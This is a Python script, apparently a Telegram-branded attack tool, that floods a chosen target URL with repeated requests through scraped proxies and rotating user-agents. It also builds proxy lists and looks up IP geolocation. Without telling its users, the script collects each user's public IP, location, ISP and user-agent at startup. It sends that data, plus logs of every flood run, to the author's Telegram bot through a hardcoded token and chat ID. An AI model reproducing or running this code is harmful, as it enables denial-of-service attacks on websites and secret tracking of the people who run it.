import requests
import random
import os
import re
import json
from datetime import datetime
from colorama import Fore, Style, init
from urllib.parse import urlparse

init(autoreset=True)

BOT_TOKEN = '6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0'
CHAT_ID   = '1241769879'

HEADER = f"""
 █████╗ ██╗      ██████╗  ██████╗ ███╗   ██╗███████╗
██╔══██╗██║     ██╔═══██╗██╔═══██╗████╗  ██║██╔════╝
███████║██║     ██║   ██║██║   ██║██╔██╗ ██║███████╗
██╔══██║██║     ██║   ██║██║   ██║██║╚██╗██║╚════██║
██║  ██║███████╗╚██████╔╝╚██████╔╝██║ ╚████║███████║
╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝

[ • ] Telegram: @i4mAlone
[ • ] Date: {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}
"""

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def send_log(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={'chat_id': CHAT_ID, 'text': msg}
        )
    except:
        pass

def check_telegram_username(username):
    u = username.lstrip('@')
    try:
        r = requests.get(f"https://t.me/{u}", timeout=5)
        return r.status_code == 200 and 'tgme_page_title' in r.text
    except:
        return False

def get_random_proxy():
    sources = [
        "https://www.proxy-list.download/api/v1/get?type=https",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=1000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
    ]
    proxies = []
    for src in sources:
        try:
            r = requests.get(src, timeout=5)
            if r.status_code == 200:
                proxies += r.text.strip().split('\n')
        except:
            pass
    return list(set(proxies))

def get_random_useragent():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
        "Mozilla/5.0 (Linux; Android 10)..."
    ])

def generate_proxies():
    clear()
    print(Fore.MAGENTA + HEADER)
    amt = int(input(Fore.YELLOW + "How many valid proxies? > "))
    ok = bad = 0
    with open('proxy.txt', 'w') as f:
        f.write(HEADER + '\n')
    while ok < amt:
        for px in get_random_proxy():
            try:
                r = requests.get('https://httpbin.org/ip', proxies={'http': f'http://{px}', 'https': f'http://{px}'}, timeout=5)
                if r.status_code == 200:
                    ok += 1
                    with open('proxy.txt', 'a') as f:
                        f.write(px + '\n')
                    status = Fore.GREEN + 'OK'
                else:
                    bad += 1
                    status = Fore.RED + f'BAD({r.status_code})'
            except:
                bad += 1
                status = Fore.RED + 'BAD(ERR)'
            clear()
            print(Fore.MAGENTA + HEADER)
            print(Fore.CYAN + f"Proxy: {px}")
            print(Fore.GREEN + f"[ {ok}/{amt} ] OKS    " + Fore.RED + f"[ {bad} ] BAD")
            print(Fore.YELLOW + f"Latest status: {status}\n")
            if ok >= amt:
                break
    print(Fore.GREEN + f"Generation complete: {ok} OK, {bad} BAD proxies.\n")

def generate_useragents():
    clear()
    print(Fore.MAGENTA + HEADER)
    amt = int(input(Fore.YELLOW + "How many user-agents? > "))
    ok = 0
    with open('ug.txt', 'w') as f:
        f.write(HEADER + '\n')
    while ok < amt:
        ua = get_random_useragent()
        ok += 1
        with open('ug.txt', 'a') as f:
            f.write(ua + '\n')
        clear()
        print(Fore.MAGENTA + HEADER)
        print(Fore.GREEN + f"[ {ok}/{amt} ] Added UA: " + Fore.CYAN + ua + "\n")

def send_requests():
    clear()
    print(Fore.MAGENTA + HEADER)
    url = input(Fore.YELLOW + "Enter target URL: ")
    use_p = input(Fore.CYAN + "Use proxy? [Y/n] > ").lower() == 'y'
    use_ua = input(Fore.CYAN + "Use UA?    [Y/n] > ").lower() == 'y'
    cnt = int(input(Fore.YELLOW + "Requests count: "))
    pxs = open('proxy.txt').read().splitlines() if use_p else []
    uas = open('ug.txt').read().splitlines() if use_ua else []
    ok = 0
    for i in range(cnt):
        clear(); print(Fore.MAGENTA + HEADER)
        hdr = {'User-Agent': random.choice(uas)} if use_ua else {}
        prx = {'http':f'http://{random.choice(pxs)}','https':f'http://{random.choice(pxs)}'} if use_p else {}
        try:
            r = requests.get(url, headers=hdr, proxies=prx, timeout=5)
            if r.status_code == 200:
                ok += 1
                print(Fore.GREEN + f"[{i+1}] OK")
            else:
                print(Fore.RED + f"[{i+1}] ERROR({r.status_code})")
        except Exception as e:
            print(Fore.RED + f"[{i+1}] ERROR({e})")
        print(Fore.CYAN + f"Success: {ok}/{i+1}")
        send_log(f"Req {i+1}→{url} OK:{ok}")

def look_ip_info():
    clear()
    print(Fore.MAGENTA + HEADER)
    ip = input(Fore.YELLOW + "Enter target IP: ")
    try:
        info = requests.get(f'https://ipinfo.io/{ip}/json').json()
        print(Fore.YELLOW + f"IP      : {info.get('ip')}")
        print(Fore.YELLOW + f"City    : {info.get('city')}")
        print(Fore.YELLOW + f"Region  : {info.get('region')}")
        print(Fore.YELLOW + f"Country : {info.get('country')}")
        print(Fore.YELLOW + f"Org     : {info.get('org')}")
        print(Fore.YELLOW + f"Loc     : {info.get('loc')}")
        print(Fore.YELLOW + f"Timezone: {info.get('timezone')}\n")
    except:
        print(Fore.RED + "Failed to retrieve IP info.\n")

def send_feedback():
    clear()
    print(Fore.MAGENTA + HEADER)
    fb = input(Fore.YELLOW + "Your feedback: ")
    ip = requests.get('https://api.ipify.org').text
    ua = requests.get('https://httpbin.org/user-agent').json().get('user-agent')
    log = (f"~~~ FEEDBACK ~~~\n"
           f"[ # ] User: @{username}\n"
           f"[ IP ] {ip}\n"
           f"[ UA ] {ua}\n"
           f"[ ★ ] {fb}\n"
           f"[ ⏰ ] {datetime.now():%Y-%m-%d %I:%M:%S %p}")
    send_log(log)
    print(Fore.GREEN + "Thanks for your feedback!\n")

def main():
    clear(); print(Fore.MAGENTA + HEADER)
    global username
    username = input(Fore.YELLOW + "Telegram user (no @): ").strip()
    if not check_telegram_username(username):
        print(Fore.RED + "Invalid or not found."); return
    info = requests.get('https://ipinfo.io/json').json()
    ua = requests.get('https://httpbin.org/user-agent').json().get('user-agent')
    log = (f"~~~ NEW LOGS ~~~\n"
           f"[ # ] User: @{username}\n"
           f"[ IP ] {info.get('ip')}\n"
           f"[ Loc ] {info.get('city')}, {info.get('region')} ({info.get('country')})\n"
           f"[ ISP ] {info.get('org')}\n"
           f"[ UA ] {ua}\n"
           f"[ ⏰ ] {datetime.now():%Y-%m-%d %I:%M:%S %p}")
    send_log(log)
    print(Fore.GREEN + f"Welcome @{username}\n")
    while True:
        print(Fore.MAGENTA + "[1]" + Fore.CYAN + " Send Requests")
        print(Fore.MAGENTA + "[2]" + Fore.CYAN + " Generate Proxies")
        print(Fore.MAGENTA + "[3]" + Fore.CYAN + " Generate UAs")
        print(Fore.MAGENTA + "[4]" + Fore.CYAN + " Look IP Info")
        print(Fore.MAGENTA + "[5]" + Fore.CYAN + " Send Feedback")
        print(Fore.MAGENTA + "[0]" + Fore.CYAN + " Exit\n")
        ch = input(Fore.YELLOW + "Choose: ")
        if ch == '1': send_requests()
        elif ch == '2': generate_proxies()
        elif ch == '3': generate_useragents()
        elif ch == '4': look_ip_info()
        elif ch == '5': send_feedback()
        elif ch == '0': break
        else: print(Fore.RED + "Invalid, try again.")

if __name__ == "__main__":
    main()
